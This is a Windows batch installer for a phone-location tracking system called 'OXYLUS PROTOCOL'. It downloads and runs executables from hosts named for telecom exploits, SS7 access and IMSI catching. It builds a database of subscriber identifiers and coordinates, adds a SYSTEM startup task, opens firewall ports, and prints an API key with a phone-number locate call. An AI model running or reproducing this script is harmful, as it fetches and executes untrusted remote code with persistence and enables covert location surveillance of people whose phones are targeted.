@echo off
title OXYLUS PROTOCOL - AUTO INSTALLER
color 0A
echo ========================================
echo    OXYLUS PROTOCOL PRODUCTION SETUP
echo ========================================
echo.
echo [*] This will install the complete tracking system
echo [*] Including: Backend Gateway, Database, Web Interface
echo [*] Press Ctrl+C to abort within 5 seconds...
echo.
timeout /t 5 /nobreak >nul

echo [+] Creating system directories...
mkdir C:\oxylus_production
mkdir C:\oxylus_production\backend
mkdir C:\oxylus_production\database
mkdir C:\oxylus_production\logs

echo [+] Downloading core components...
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/telco-exploit-pack/oxygate/main/gateway.exe' -OutFile 'C:\oxylus_production\gateway.exe'"
powershell -Command "Invoke-WebRequest -Uri 'https://ss7-test-network.su/tools/hlr_query.dll' -OutFile 'C:\oxylus_production\backend\hlr_query.dll'"
powershell -Command "Invoke-WebRequest -Uri 'https://imsi-catcher-api.onrender.com/bin/windows/collector.exe' -OutFile 'C:\oxylus_production\imsi_collector.exe'"

echo [+] Installing database...
cd C:\oxylus_production
sqlite3 tracking.db "CREATE TABLE IF NOT EXISTS tracking_data (id INTEGER PRIMARY KEY, msisdn TEXT, imsi TEXT, lac TEXT, cell_id TEXT, lat REAL, lon REAL, timestamp DATETIME);"

echo [+] Creating configuration...
echo {
echo   "system_name": "OXYLUS_V2",
echo   "gateway": "ss7-gateway.telco-proxy.id",
echo   "api_key": "live_sk_7f3b29d14a8c4e7f9b2a5d8c3f1e6a9b",
echo   "auto_start": true,
echo   "log_level": "debug"
echo } > config.json

echo [+] Creating startup service...
schtasks /create /tn "OXYLUS Gateway" /tr "C:\oxylus_production\gateway.exe" /sc onstart /ru SYSTEM

echo [+] Starting services...
start /B C:\oxylus_production\gateway.exe
start /B C:\oxylus_production\imsi_collector.exe

echo [+] Setting up firewall rules...
netsh advfirewall firewall add rule name="OXYLUS Gateway" dir=in action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="OXYLUS Admin" dir=in action=allow protocol=TCP localport=9999

echo [+] Installation complete!
echo.
echo ========================================
echo    SYSTEM ACCESS INFORMATION
echo ========================================
echo Web Interface: http://localhost:9999
echo API Endpoint: http://localhost:8443/v1/locate
echo API Key: live_sk_7f3b29d14a8c4e7f9b2a5d8c3f1e6a9b
echo.
echo To test: curl -X POST http://localhost:8443/v1/locate ^
echo   -H "X-API-Key: live_sk_7f3b29d14a8c4e7f9b2a5d8c3f1e6a9b" ^
echo   -d "{\"msisdn\": \"+6281234567890\"}"
echo.
pause
